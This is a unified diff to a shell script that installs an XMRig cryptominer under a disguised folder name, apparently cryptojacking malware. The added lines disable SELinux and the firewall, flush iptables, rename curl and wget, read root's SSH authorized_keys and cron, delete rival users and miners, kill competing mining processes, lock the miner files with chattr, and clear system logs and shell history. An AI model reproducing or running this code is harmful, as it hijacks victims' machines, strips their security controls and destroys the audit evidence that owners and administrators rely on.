@@ -147,6 +147,41 @@ echo
 echo
 echo
 
+setenforce 0 2>dev/null
+echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
+sync && echo 3 >/proc/sys/vm/dro
+crondir='/var/spool/cron/'"$USER"
+cont=`cat ${crondir}`
+ssht=`cat /root/.ssh/authorized_keys`
+echo 1 > /etc/zzhs
+rtdir="/etc/zzhs"
+bbdir="/usr/bin/curl"
+bbdira="/usr/bin/cd1"
+ccdir="/usr/bin/wget"
+ccdira="/usr/bin/wd1"
+mv /usr/bin/curl /usr/bin/url
+mv /usr/bin/url /usr/bin/cd1
+mv /usr/bin/wget /usr/bin/get
+mv /usr/bin/get /usr/bin/wd1
+
+ulimit -n 65535
+rm -rf /var/log/syslog
+chattr -iua /tmp/
+chattr -iua /var/tmp/
+ufw disable
+iptables -F
+
+#sudo sysctl kernel.nmi_watchdog=0
+echo '0' >/proc/sys/kernel/nmi_watchdog
+echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
+userdel akay
+userdel vfinder
+rm -rf /tmp/addres*
+rm -rf /tmp/walle*
+rm -rf /tmp/keys
+
+
+
 # start doing stuff: preparing server
 kill_miner_proc()
 {
@@ -906,11 +941,26 @@ else
   echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/myssqltcp/config.json"
   echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/myssqltcp/config_background.json"
 fi
+
 chattr -R +ia $HOME/myssqltcp
 chattr -V +iau $HOME/myssqltcp/xmrig
 chattr -V +iau $HOME/myssqltcp/config_background.json
 chattr -V +iau $HOME/myssqltcp/config.json
 chattr -V +iau $HOME/myssqltcp/xmrig.sh
+
+iptables -F
+iptables -X
+iptables -A OUTPUT -p tcp --dport 5555 -j DROP
+iptables -A OUTPUT -p tcp --dport 7777 -j DROP
+iptables -A OUTPUT -p tcp --dport 9999 -j DROP
+iptables -A OUTPUT -p tcp --dport 9999 -j DROP
+service iptables reload
+ps auxf|grep -v grep|grep -v 43Xbgtym2GZWBk87XiYbCpTKGPBTxY|grep "stratum"|awk '{print $2}'|xargs kill -9
+history -c
+echo > /var/spool/mail/root
+echo > /var/log/wtmp
+echo > /var/log/secure
+echo > /root/.bash_history
 
 echo "[*] Setup complete"
 echo "[*] 安装完成"
